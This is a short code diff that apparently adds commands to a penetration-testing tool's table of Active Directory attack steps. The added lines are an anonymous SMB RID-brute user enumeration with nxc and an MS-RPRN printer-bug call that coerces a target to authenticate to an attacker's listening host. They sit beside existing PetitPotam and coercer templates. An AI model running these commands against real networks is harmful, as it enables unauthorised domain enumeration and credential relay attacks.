@@ -4844,10 +4844,12 @@ _STEP_COMMANDS = {
         ],
         2: [
             "rpcclient -U '' -N <RHOST> -c 'enumdomusers;querydominfo;lsaquery'",
+            "nxc smb <RHOST> -u '' -p '' --rid-brute   # RID cycle when enumdomusers is blocked",
             "impacket-samrdump <DOMAIN>/<USER>:<PASS>@<RHOST>",
         ],
         3: [
             "python3 PetitPotam.py -u <USER> -p <PASS> <LHOST> <RHOST>",
+            "printerbug.py '<DOMAIN>/<USER>:<PASS>@<RHOST>' <LHOST>   # MS-RPRN",
             "coercer coerce -u <USER> -p <PASS> -t <RHOST> -l <LHOST>",
         ],
         4: [
